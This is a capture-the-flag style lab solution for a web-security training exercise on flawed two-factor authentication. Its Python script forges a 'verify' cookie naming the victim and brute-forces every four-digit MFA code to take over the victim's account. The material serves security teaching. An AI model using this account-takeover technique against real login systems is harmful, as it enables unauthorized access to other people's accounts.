# 2FA broken logic
> This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
- Your credentials: `wiener:peter`
- Victim's username: `carlos`
> You also have access to the email server to receive your 2FA verification code.
#### Hint
> Carlos will not attempt to log in to the website himself.

```python
import requests
import sys

BASE_URL = "https://0ad7001e036f972180d68f8200fc001b.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    login2_endpoint = f"{url}login2"
    target_cookie = {"verify": "carlos"}
    
    # 1. Trigger MFA code generation for Carlos
    response = session.get(login2_endpoint, cookies=target_cookie)
    
    if response.status_code == 200:
        print("[+] Verification cookie set. Brute-forcing MFA...")
        
        # 2. Sequential Brute-Force Loop
        for i in range(10000):
            mfa_code = f"{i:04d}"
            payload = {"mfa-code": mfa_code}
            
            sys.stdout.write(f"\r[*] Testing code: {mfa_code}")
            sys.stdout.flush()
            
            response = session.post(
                login2_endpoint, 
                data=payload, 
                cookies=target_cookie, 
                allow_redirects=False
            )
            
            # 3. Validation and Pivot
            if response.status_code == 302:
                print(f"\n[+] SUCCESS: MFA Code found -> {mfa_code}")
                
                my_account_endpoint = f"{url}my-account"
                final_response = session.get(my_account_endpoint)
                
                if "carlos" in final_response.text:
                    print("[+] TARGET SECURED: Lab Solved.")
                break

if __name__ == "__main__":
    exploit(BASE_URL)
```